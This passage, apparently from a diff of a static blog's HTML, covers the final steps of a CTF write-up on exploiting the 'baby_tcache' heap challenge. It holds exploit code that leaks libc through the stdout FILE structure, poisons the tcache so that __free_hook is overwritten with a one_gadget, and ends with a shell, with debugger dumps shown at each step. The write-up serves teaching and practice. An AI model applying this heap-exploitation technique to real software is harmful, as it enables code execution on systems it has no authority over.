+  vtable <span class="token operator">=</span> <span class="token number">0x7fa02939c2a0</span> <span class="token operator">&lt;</span>_IO_file_jumps<span class="token operator">></span>
+<span class="token punctuation">}</span></code></pre>
+<pre class=" language-py"><code class="language-py">add(0x60,"w")
+add(0x60,p64(0xfbad1800) + p64(0x00)*3 + b"\x00",1)</code></pre>
+<p>This resulted in:-</p>
+<p><img src="/img/pwning/dump.png" alt></p>
+<p>Now, such that this has happened, we carefully parse the leak which resulted in a success LIBC leak:-</p>
+<pre class=" language-py"><code class="language-py">libc_leak=u64(p.recv(6)+b"\x00\x00")-0x3ebff0
+
+log.info("LIBC:  "+hex(libc_leak))
+free_hook=libc_leak + libc.symbols['__free_hook']
+system=libc_leak + libc.symbols['system']
+one_gadget = libc_leak+0x4f432</code></pre>
+<p>And we get a success LIBC leak, thus defeating the ASLR:-</p>
+<pre class=" language-r"><code class="language-r"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./baby_tcache'</span><span class="token operator">:</span> pid <span class="token number">4839</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
+    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little
+    RELRO<span class="token operator">:</span>    Partial RELRO
+    Stack<span class="token operator">:</span>    Canary found
+    NX<span class="token operator">:</span>       NX enabled
+    PIE<span class="token operator">:</span>      PIE enabled
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token number">0x7ff4d3954000</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode
+
+<span class="token punctuation">[</span>..snip..<span class="token punctuation">]</span>
+
+🍊      Baby Tcache      🍊
+<span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span>
+<span class="token operator">$</span>   <span class="token number">1</span>. New heap           <span class="token operator">$</span>
+<span class="token operator">$</span>   <span class="token number">2</span>. Delete heap        <span class="token operator">$</span> 
+<span class="token operator">$</span>   <span class="token number">3</span>. Exit               <span class="token operator">$</span> 
+<span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span><span class="token operator">$</span>
+Your choice<span class="token operator">:</span> <span class="token operator">$</span>  
+
+</code></pre>
+<p>Now, from this point we will just overwrite the <code>fd</code> of a <code>free</code>‘d tcache chunk with our target address such that during next allocation, depending on the size will return the target via <code>malloc</code> allowing us to overwrite it. Given the heap condition as of now, when we look at the available bins, we see:-</p>
+<pre class=" language-r"><code class="language-r">gef➤  heap bins
+────────────────────────────────── Tcachebins <span class="token keyword">for</span> arena <span class="token number">0x7fe15febfc40</span> ──────────────────────────────────
+Tcachebins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">]</span> count<span class="token operator">=</span><span class="token number">1</span>  ←  Chunk<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x55ab342e0810</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x7fe15febfca0</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token punctuation">)</span> 
+Tcachebins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x70</span><span class="token punctuation">]</span> count<span class="token operator">=</span><span class="token number">255</span>  ←  <span class="token punctuation">[</span>Corrupted chunk at <span class="token number">0xfbad2887</span><span class="token punctuation">]</span>
+─────────────────────────────────── Fastbins <span class="token keyword">for</span> arena <span class="token number">0x7fe15febfc40</span> ───────────────────────────────────
+Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">]</span> <span class="token number">0x00</span>
+Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x30</span><span class="token punctuation">]</span> <span class="token number">0x00</span>
+Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x40</span><span class="token punctuation">]</span> <span class="token number">0x00</span>
+Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">]</span> <span class="token number">0x00</span>
+Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">]</span> <span class="token number">0x00</span>
+Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x70</span><span class="token punctuation">]</span> <span class="token number">0x00</span>
+Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x80</span><span class="token punctuation">]</span> <span class="token number">0x00</span>
+────────────────────────────────── Unsorted Bin <span class="token keyword">for</span> arena <span class="token string">'main_arena'</span> ──────────────────────────────────
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> unsorted_bins<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">:</span> fw<span class="token operator">=</span><span class="token number">0x55ab342e07f0</span><span class="token punctuation">,</span> bk<span class="token operator">=</span><span class="token number">0x55ab342e07f0</span>
+ →   Chunk<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x55ab342e0800</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x530</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>PREV_INUSE<span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Found <span class="token number">1</span> chunks <span class="token keyword">in</span> unsorted bin.</code></pre>
+<p>If you pay close attention, the chunk of the <code>unsorted</code> bin is pointing to the address <code>0x55.....0800</code> and at the same time the <code>tcache bin[0]</code>‘s chunk point to the <code>0x55....0810</code>, this proposed the idea of allocating a chunk of a size which will return the exact chunk pointed by the <code>unsorted</code> bin, that way we will be able to overwrite the <code>fd</code> of the <code>tcache</code> chunk <code>0x55......0810</code>.</p>
+<pre class=" language-py"><code class="language-py">add(0x400,p64(0x00)*2 +p64(free_hook))</code></pre>
+<p>Doing that so, this will overwrite the <code>fd</code> of the chunk <code>0x55...810</code> to the address of the <code>free_hook</code>, for which we can get it in next allocation-</p>
+<pre class=" language-r"><code class="language-r">gef➤  heap bins tcache
+────────────────────────────────── Tcachebins <span class="token keyword">for</span> arena <span class="token number">0x7fe15febfc40</span> ──────────────────────────────────
+Tcachebins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">]</span> count<span class="token operator">=</span><span class="token number">1</span>  ←  Chunk<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x55ab342e0810</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x0</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token punctuation">)</span>  ←  Chunk<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x7fe15fec18e8</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x0</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token punctuation">)</span> 
+Tcachebins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x70</span><span class="token punctuation">]</span> count<span class="token operator">=</span><span class="token number">255</span>  ←  <span class="token punctuation">[</span>Corrupted chunk at <span class="token number">0xfbad2887</span><span class="token punctuation">]</span>
+
+gef➤  p <span class="token operator">&amp;</span>__free_hook 
+<span class="token operator">$</span><span class="token number">60</span> <span class="token operator">=</span> <span class="token punctuation">(</span>void <span class="token punctuation">(</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>void <span class="token operator">*</span><span class="token punctuation">,</span> const void <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token number">0x7fe15fec18e8</span> <span class="token operator">&lt;</span>__free_hook<span class="token operator">></span>
+</code></pre>
+<p>We successfully overwritten the chunk <code>0x55..810</code>‘s <code>fd</code> to the address of the <code>free_hook</code>, now we will just do two allocations, one will return the chunk <code>0x55..810</code> and the other one will give us the target i.e. <code>__free_hook</code>.</p>
+<pre class=" language-py"><code class="language-py">add(0x10,"a")   # Gives the chunk 0x55....810
+add(0x10,p64(one_gadget),1)  # Gives the __free_hook address and result in being overwritten with the one_gadget address</code></pre>
+<p>Given this, it’ll result in the <code>__free_hook</code> being overwritten with the <code>one_gadget</code> address:-</p>
+<pre class=" language-r"><code class="language-r">gef➤  x<span class="token operator">/</span>xg <span class="token operator">&amp;</span>__free_hook 
+<span class="token number">0x7fa27c4e18e8</span> <span class="token operator">&lt;</span>__free_hook<span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007fa27c143432</span></code></pre>
+<p>Great, we successfully overwrote the <code>__free_hook</code> address, now we will just do <code>free(0)</code> which will just result in the <code>one_gadget</code> being called, spawning a shell:-</p>
+<pre class=" language-py"><code class="language-py">free(0)</code></pre>
+<p>Now, we get a shell:-</p>
+<pre class=" language-r"><code class="language-r"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./baby_tcache'</span><span class="token operator">:</span> pid <span class="token number">6009</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
+    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little
+    RELRO<span class="token operator">:</span>    Partial RELRO
+    Stack<span class="token operator">:</span>    Canary found
+    NX<span class="token operator">:</span>       NX enabled
+    PIE<span class="token operator">:</span>      PIE enabled
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token number">0x7fa27c0f4000</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Paused <span class="token punctuation">(</span>press any to continue<span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode
+<span class="token operator">$</span> whoami
+vagrant
+<span class="token operator">$</span> ls 
+baby_tcache     children_tcache.i64  house_of_einherjar.c
+baby_tcache.i64  children_tcache.py   libc.so<span class="token number">.6</span>
+baby_tcache.py     core              overlapping_chunks
+children_tcache  house_of_einherjar   overlapping_chunks.c
+<span class="token operator">$</span>  </code></pre>
+<p>This was it, although this could be more explainative if we go in-depth about the <code>_IO_2_1_stdout_</code> part, for that, I saved the analysis to later on. Now, that was that, have fun pwning.</p>
 
                 
             </div>
@@ -1289,7 +1564,7 @@ Pwned
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">47.7k</span>&nbsp;字
+                class="white-color">49.8k</span>&nbsp;字
             
             
             
